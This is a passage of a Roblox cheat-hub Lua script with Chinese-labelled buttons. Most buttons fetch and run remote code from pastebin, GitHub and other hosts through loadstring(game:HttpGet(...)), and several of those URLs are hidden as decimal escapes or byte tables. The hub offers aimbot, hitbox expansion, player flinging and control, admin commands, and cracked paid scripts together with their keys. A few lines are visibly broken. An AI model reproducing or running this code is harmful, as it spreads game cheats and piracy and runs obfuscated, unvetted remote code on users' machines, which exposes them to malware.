loadstring(game:HttpGet("https://pastebin.com/raw/ahK5jRxM"))()
  end
})

Tab:AddButton({
  Name = "0范围",

  Callback = function()
_G.HeadSize = 0
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)

  end
})

Tab:AddButton({
  Name = "普通范围",
  Callback = function ()

_G.HeadSize = 30
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)

  end
})

Tab:AddButton({
  Name = "中等范围",
  Callback = function ()

_G.HeadSize = 100
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)

  end
})

Tab:AddButton({
    Name="全图范围",
    Callback=function()

_G.HeadSize = 500
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)

    end
})

Tab:AddButton({
    Name="终极范围",
    Callback=function()

_G.HeadSize = 2500
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really red")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)

    end
})

Tab:AddButton({
	Name = "选人甩飞（需要输入别人的名字）",
	Callback = function()
	
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Auto%20Fling%20Player'))()

end
})

Tab:AddButton({
  Name = "刷道具",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/wT1aKD4B"))()
  end
})

Tab:AddButton({
      Name = "位置",
      Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/ZJeTvyzG"))()
      end    
})

Tab:AddButton({
	Name = "爬墙",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end
})

Tab:AddButton({
  Name = "让物体起飞(Q键使用)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/ajduoxc/refs/heads/main/ajduoxcz"))()
  end
})

Tab:AddButton({
  Name = "键盘(配合其他脚本使用)",
  Callback = function()
  loadstring(game:HttpGet("https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr"))()
  end
})

Tab:AddButton({
	Name = "键盘脚本(第2种)",
	Callback = function()
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()

end
})

Tab:AddButton({
  Name = " 飞车",
  Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/gNqZiexm"))()

  end
})

Tab:AddButton({
  Name = "动作(按，开启)",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/ws8cJmTD"))()
  end
})

Tab:AddButton({
  Name = "上头定在原地",
  Callback = function()
    local lp = game:GetService "Players".LocalPlayer
    if lp.Character:FindFirstChild "Head" then
      local char = lp.Character
      char.Archivable = true
      local new = char:Clone()
      new.Parent = workspace
      lp.Character = new
      wait(0.1)
      local oldhum = char:FindFirstChildWhichIsA "Humanoid"
      local newhum = oldhum:Clone()
      newhum.Parent = char
      newhum.RequiresNeck = false
      oldhum.Parent = nil
      wait(0.1)
      lp.Character = char
      new:Destroy()
      wait(0.1)
      newhum:GetPropertyChangedSignal("Health"):Connect(
      function()
        if newhum.Health <= 0 then
          oldhum.Parent = lp.Character
          wait(0.1)
          oldhum:Destroy()
        end
      end)
      workspace.CurrentCamera.CameraSubject = char
      if char:FindFirstChild "Animate" then
        char.Animate.Disabled = true
        wait(0.1)
        char.Animate.Disabled = false
      end
      lp.Character:FindFirstChild "Head":Destroy()
    end
end
})

Tab:AddButton({
  Name = "让走路和跳跃变卡(对别人没影响)",
  Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Fe%20Fake%20Lag%20Obfuscator'))()
  end
})

Tab:AddButton({
  Name = "飞檐走壁",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
  end
})

Tab:AddButton({
  Name = "滚动",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/111/refs/heads/main/192"))()
  end
})

Tab:AddButton({
  Name = "动画包",
  Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/fTsp2ZgP"))()

  end
})

Tab:AddButton({
  Name = "控制玩家",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/BOOSBS/refs/heads/main/README.md"))()
  end
})

Tab:AddButton({
  Name = "认真反复横跳",
  Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
  end
})

Tab:AddButton({
  Name = "自瞄",
  Callback = function()
   loadstring(game:HttpGet("https://pastebin.com/raw/tYuVRD8r"))()
  end
})

Tab:AddButton({
  Name = "定住自己",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/YrfBSuWw"))()
  end
})

Tab:AddButton({
   Name = "工具包",
   Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/StandAwekening.lua"))()
   end
})

Tab:AddButton({
	Name = "踏空行走",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
	end
})

local Tab = Window:MakeTab({
	Name = "指令挂",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton({
  Name = "指令脚本",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
  end
})

Tab:AddLabel("tpua黑洞脚本(只能吸走一些,建筑物吸不了)")
Tab:AddLabel("fling旋转(可以甩人)")
Tab:AddLabel("fly飞行")
Tab:AddLabel("bang能够掀人")
Tab:AddLabel("noface没有脸")
Tab:AddLabel("headsit坐在玩家头上加玩家名字")
Tab:AddLabel("float悬浮")
Tab:AddLabel("re重置人物但位置不变")
Tab:AddLabel("dance跳舞")
Tab:AddLabel("nolegs没有腿")
Tab:AddLabel("walltp碰到墙壁传送到墙壁顶部")
Tab:AddLabel("bring+玩家名字可以让玩家吸到你手上但是只能用于一些服务器")
Tab:AddLabel("carpet趴着走")
Tab:AddLabel("infjump无限跳跃")
Tab:AddLabel("xray透视地图所有物体变透明")
Tab:AddLabel("bang玩家开头两个英文吸在玩家身后")
Tab:AddLabel("noanim没有动作")
Tab:AddLabel("spin人物旋转")
Tab:AddLabel("sitwalk坐着走")
Tab:AddLabel("trip让你的人物摔倒")
Tab:AddLabel("antikick防踢")
Tab:AddLabel("lay躺下")
Tab:AddLabel("sit坐")
Tab:AddLabel("god加血")
Tab:AddLabel("invisfling配合加血可以旋转")
Tab:AddLabel("goto+玩家名字传送")
Tab:AddLabel("unxray关闭透视")
Tab:AddLabel("noclip穿墙")
Tab:AddLabel("有的可能不能用")

local Tab = Window:MakeTab({
    Name = "FE",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "C00lgui",
  Callback = function()
  loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
  end
})

Tab:AddButton({
  Name = "1x1x1x1",
  Callback = function()
  loadstring(game:HttpGet(('https://pastebin.com/raw/JipYNCht'),true))()
  end
})

Tab:AddButton({
  Name = "大长腿",
  Callback = function()
  loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/7291747e9f093555573e027621f08d6e/raw/23b48f2463942befe19d81aa8a06e3222996242c/FE%2520Da%2520Feets'))()
  end
})

Tab:AddButton({
  Name = "复仇者",
  Callback = function()
  loadstring(game:HttpGet(('https://pastefy.ga/iGyVaTvs/raw'),true))()
  end
})

Tab:AddButton({
  Name = "鼠标",
  Callback = function()
  loadstring(game:HttpGet(('https://pastefy.ga/V75mqzaz/raw'),true))()
  end
})

Tab:AddButton({
  Name = "香蕉枪",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/BananaGunByNerd.lua"))()
  end
})

Tab:AddButton({
  Name = "超长丁丁",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/ESWSFND7", true))()
  end
})

Tab:AddButton({
  Name = "猫娘R63",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
  end
})

Tab:AddButton({
  Name = "变玩家",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/XR4sGcgJ"))()
  end
})

Tab:AddButton({
  Name = "FE动画中心",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
  end
})

local Tab = Window:MakeTab({
	Name = "念力",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
  Name = "获取念力工具",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/dbcy7SHF"))()
  end
})

Tab:AddLabel("Q - 靠近")
Tab:AddLabel("E - 离远")
Tab:AddLabel("Y - 投掷")
Tab:AddLabel("J - 超级投掷")
Tab:AddLabel("U - 使物体自转")
Tab:AddLabel("P - 使物体悬浮在空中")
Tab:AddLabel("X - 走得更远一点")
Tab:AddLabel("L - 使方块变直并锁定在前部")

Tab:AddButton({
  Name = "让手上的道具飘起来",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/WmD8MuSx"))()
  end
})

Tab:AddLabel("J-飞起来")
Tab:AddLabel("K-回到手中")

local Tab = Window:MakeTab({
	Name = "变身(只能自己看)",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddLabel("部分服务器可以用")
Tab:AddButton({
  Name = "大BOSS",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/NChRru9B"))()
  end
})

Tab:AddButton({
  Name = "变大变小",
  Callback = function()

loadstring(game:HttpGet("https://pastebin.com/raw/cEa7d3a5"))()

  end
})

Tab:AddButton({
  Name = "大飞机",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/EJS2Fde3"))()
  end
})

Tab:AddButton({
  Name = "巫毒娃娃",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/xqCCqeha"))()
  end
})

Tab:AddButton({
  Name = "天使",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/RaXbiByH"))()
  end
})

local Tab = Window:MakeTab({
    Name = "黑洞融合表",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddLabel("黑洞中心独家创作")
Tab:AddLabel("普通黑洞2+所有黑洞=超级黑洞")
Tab:AddLabel("超级黑洞+辅助黑洞=最强黑洞")
Tab:AddLabel("全部黑洞通用融合表")
Tab:AddLabel("👆以上为亲身测试得出的结论☝")

local Tab = Window:MakeTab({
    Name = "滤镜与光影",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
	Name = "自定义画质包",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
end
})

Tab:AddButton({
      Name = "恢复默认",
      Callback = function()
        game.Lighting.Ambient = Color3.new(0, 0, 0)
      end
    })


Tab:AddButton({
      Name = "亮度1",
      Callback = function()
        game.Lighting.Ambient = Color3.new(1, 1, 1)
      end
    })
Tab:AddButton({
      Name = "亮度2",
      Callback = function()
        game.Lighting.Ambient = Color3.new(2, 2, 2)
      end
    })

Tab:AddButton({
      Name = "亮度3",
      Callback = function()
        game.Lighting.Ambient = Color3.new(3, 3, 3)
      end
    })

Tab:AddButton({
	Name = "红色",
	Callback = function()
game.Lighting.Ambient = Color3.new(1, 0, 0)
end
})    
Tab:AddButton({
	Name = "绿色",
	Callback = function()
game.Lighting.Ambient = Color3.new(0, 1, 0)
end
})    

Tab:AddButton({
      Name = "蓝色",
      Callback = function()
        game.Lighting.Ambient = Color3.new(0, 0, 1)
      end
    })
Tab:AddButton({
  Name = "红色(2)",
  Default = false,
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
  end
})

Tab:AddButton({
  Name = "美丽天空（带动态阴影）",
  Callback = function()
    -- Roblox Graphics Enhancher
    local light = game.Lighting
    for i, v in pairs(light:GetChildren()) do
      v:Destroy()
    end

    local ter = workspace.Terrain
    local color = Instance.new("ColorCorrectionEffect")
    local bloom = Instance.new("BloomEffect")
    local sun = Instance.new("SunRaysEffect")
    local blur = Inst
  end
})

Tab:AddButton({
  Name = "光影(1)",
  Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/gUceVJig'))()
  end
})

Tab:AddButton({
  Name = "光影(2)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
  end
})

Tab:AddButton({
  Name = "光影(3)",
  Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/jHBfJYmS"))()
  end
})

local Tab = Window:MakeTab({
    Name = "脚本合集",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "林脚本破解版",
  Callback = function()
  AL = "Advanced Logic团队破解"
loadstring(game:HttpGet("https://raw.githubusercontent.com/longshu886/longscript/main/linpojie"))()
end
})

Tab:AddButton({
  Name = "安脚本",
  Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/wucan114514/gegeyxjb/refs/heads/main/%E5%AE%89%E8%84%9A%E6%9C%AC.lua')))()
  end
})

Tab:AddButton({
  Name = "ato",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/atoyayaya/jiaoben/main/jiamilist"))()
  end
})

Tab:AddButton({
  Name = "USA（卡密：USA AER）",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/USA.lua"))()
  end
})

Tab:AddButton({
	Name = "USA卡密",
	Callback = function()
setclipboard("USA AER")
end
})

Tab:AddButton({
  Name = "秋脚本",
  Callback = function()
  _G[".秋·自制脚本 遗存抢救"]="2024dncxddtsnchzxtb0112"loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,98,117,113,47,45,47,109,97,105,110,47,37,69,55,37,65,55,37,56,66,37,67,50,37,66,55,37,69,56,37,56,55,37,65,65,37,69,53,37,56,56,37,66,54,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67})end)())))()
  end
})
Tab:AddButton({
  Name = "龙脚本破解版",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/nahida-cn/Roblox/main/long"))()
  end
})

Tab:AddButton({
  Name = "皇脚本无卡密",
  Callback = function()
 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\100\84\55\99\65\82\84"))()
  end
})

Tab:AddButton({
  Name = "小达",
  Callback = function()
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\49\51\51\117\102\117\100\104\100\117\47\72\76\68\72\81\86\81\82\80\66\47\109\97\105\110\47\81\85\81\34\41\41\40\41\10")()
  end
})

Tab:AddButton({
  Name = "智狐中心",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ZH-FH/ZHZX-X/refs/heads/main/%E6%99%BA%E7%8B%90%E4%B8%AD%E5%BF%83.lua"))()
  end
})

Tab:AddButton({
  Name = "西",
  Callback = function()
  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,101,110,116,114,121,46,99,111,47,120,105,106,105,97,111,98,101,110,47,114,97,119})end)())))()
  end
})

Tab:AddButton({
  Name = "导管中心修复版,但仍有一些功能无法使用",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/useranewrff/roblox/main/%E6%9D%A1%E6%AC%BE%E5%8D%8F%E8%AE%AE.lua"))()
  end
})

Tab:AddButton({
  Name = "tm脚本中心",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FZIKNEZNTAXSUGVD/-1/main/%E8%87%AA%E5%88%B6%E8%84%9A%E6%9C%AC"))()
  end
})

Tab:AddButton({
  Name = "导管中心",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
 end
})

Tab:AddButton({
  Name = "云脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/Xiaos______________________________________________________________Yun__________________________________________________________________________betaV2.3------------------------------------------------------------------------------------jsjalololololololololololololololololololllololol.lua"))()
  end
})

Tab:AddButton({
  Name = "情云脚本中心",
  Callback = function()
loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
  end
})

Tab:AddButton({
  Name = "落叶中心",
  Callback = function()
getgenv().LS="落叶中心" loadstring(game:HttpGet("https://raw.githubusercontent.com/krlpl/Deciduous-center-LS/main/%E8%90%BD%E5%8F%B6%E4%B8%AD%E5%BF%83%E6%B7%B7%E6%B7%86.txt"))()
  end
})

Tab:AddButton({
	Name = "青蛙",
	Callback = function()
   
getgenv().eom = "青蛙"
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\122\120\115\81\82\68\85\39\41\41\40\41")()
    end
})

Tab:AddButton({
  Name = "蓝脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/ScriptsDache/main/%E4%BC%90%E6%9C%A8%E5%A4%A7%E4%BA%A822.lua", true))()
  end
})

Tab:AddButton({
  Name = "大司马v5",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/whenheer/gfop/refs/heads/main/Protected_4687541665942703.lua"))()
  end
})

Tab:AddButton({
  Name = "空情脚本",
  Callback = function()
  loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8628/%E9%9D%99?sign=uxlt7ravTFmP3TZLNgN7zImLHxJWhH93SEbKgFA_PRc%3D%3A0"))()
  end
})

Tab:AddButton({
  Name = "鹤脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/qazpin66/-/refs/heads/main/%E9%B9%A41.5.lua"))()
  end
})

Tab:AddButton({
	Name = "地岩",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\98\97\109\120\98\98\97\109\120\98\98\97\109\120\47\99\111\100\101\115\112\97\99\101\115\45\98\108\97\110\107\47\109\97\105\110\47\37\69\55\37\57\57\37\66\68\34\41\41\40\41")()
    end
})

Tab:AddButton({
    Name = "冰",
    Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/GR4ChWKv"))()
    end
})

Tab:AddButton({
    Name = "傻脚本",
    Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sharksharksharkshark/shark-shark-shark-shark-shark/main/shark-scriptlollol.txt",true))()
    end
})

Tab:AddButton({
	Name = "泠脚本",
	Callback = function()
      getgenv().Leng="冷脚本QQ群815883059" loadstring(game:HttpGet("https://raw.githubusercontent.com/odhdshhe/lenglenglenglenglenglenlenglenglenglenglenglenglengleng-LBT-H-cold-script/refs/heads/main/LENG%20LBT-H%20cold%20script.txt"))()
  	end
})

Tab:AddButton({
	Name = "鸭",
	Callback = function()
loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,81,89,49,113,112,99,115,106})end)())))()
    end
})

Tab:AddButton({
  Name = "斌脚本2.0.1",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\73\78\106\105\97\111\98\122\120\54\47\66\73\78\106\105\97\111\47\109\97\105\110\47\66\73\78\46\108\117\97\34\41\41\40\41\10")
  end
})

Tab:AddButton({
  Name = "星中心云端",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\49\82\50\87\69\76\120\67\34\41\41\40\41")()
  end
})

Tab:AddButton({
Name = "刺客",
	Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/WDQi/SF/main/%E7%9C%8B%E4%BD%A0M.txt')))()
    end
})

Tab:AddButton({
    Name = "北约中心",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/USA868/114514-55-646-114514-88-61518-618-840-1018-634-10-4949-3457578401-615/main/Protected-36.lua"))()
    end
})

Tab:AddButton({
  Name = "白银v1.0",
  Callback = function()
  loadstring(game:HelpGet("https://pastebin.com/raw/beaK94QW"))()
  end
})

Tab:AddButton({
  Name = "*脚踏脚本",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
  end
})

Tab:AddButton({
  Name = "康师傅",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\116\48\57\105\101\101\122\34\41\41\40\41\10")()
  end
})

Tab:AddButton({
  Name = "空情",
  Callback = function()
  loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8628/%E9%9D%99?sign=uxlt7ravTFmP3TZLNgN7zImLHxJWhH93SEbKgFA_PRc%3D%3A0"))()
  end
})

Tab:AddButton({
  Name = "狂哥1.1.4",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua'))()
  end
})

Tab:AddButton({
  Name = "苗v4",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/CN1919810/miaouuu/main/miaov4.lua"))()
  end
})

Tab:AddButton({
  Name = "仙脚本",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\103\49\55\70\54\74\80"))()
  end
})

Tab:AddButton({
  Name = "云脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/VIP/main/%E4%BA%91%E8%84%9A%E6%9C%AC/UNIVERSAL%20VERSION.LUA", true))()
  end
})

Tab:AddButton({
  Name = "小go脚本",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GTAFAW/goto/main/%E5%88%AB%E5%BC%80%E6%88%91%E4%BA%91%E4%BA%86%EF%BC%8C%E6%88%91%E6%B1%82%E4%BD%A0%E4%BA%86%E4%BD%A0%E5%BC%80%E6%88%91%E5%85%83%E5%B9%B2%E5%98%9B%E5%95%8A%EF%BC%9F%E8%84%9A%E6%9C%AC%E6%98%AF%E6%B0%B8%E4%B9%85%E5%85%8D%E8%B4%B9%E7%9A%84%EF%BC%8C%E6%94%BE%E4%B8%8B%E5%90%A7%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%83%B3%E8%A6%81%E6%BA%90%E7%A0%81%E5%8F%AF%E4%BB%A5%E6%89%BE%E6%88%91%E8%A6%81%EF%BC%8C%E6%88%91%E4%BC%9A%E7%BB%99%E4%B8%80%E7%82%B9.lua"))()
  end
})

Tab:AddButton({
  Name = "冰红茶脚本",
  Callback = function()
  loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/8582/Protected_9297682332119129.lua?sign=jP-h1AGooC90C0A0O5eDboOCoaQTZpOzLoWzg_oz1eE%3D%3A0"))()
  end
})

Tab:AddButton({
  Name = "哦脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/chinanb114514-png/ojiaoben/refs/heads/main/%E9%9C%9Cv2.lua.txt"))()
  end
})

Tab:AddButton({
  Name = "人脚本",
  Callback = function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110"))()
  end
})

Tab:AddButton({
  Name = "蓝标脚本",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/THDZEP/Blue-blue-blue/refs/heads/main/%E5%8F%91%E7%A5%A8%E8%93%9D%E6%A0%87"))()
  end
})

Tab:AddButton({
  Name = "南宁中心",
  Callback = function()
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\88\67\87\82\87\110\76\34\41\40\41\40\103\97\109\101\58\72\116\116\112\71\101\116\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\78\112\86\65\110\119\110\104\34\41\40\41\10")()
  end
})

Tab:AddButton({
    Name = "脚本中心",
    Callback = function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
    end
})

Tab:AddButton({
  Name = "LG脚本",
  Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
  end
})

Tab:AddButton({
  Name = "QI脚本免费版",
  Callback = function()
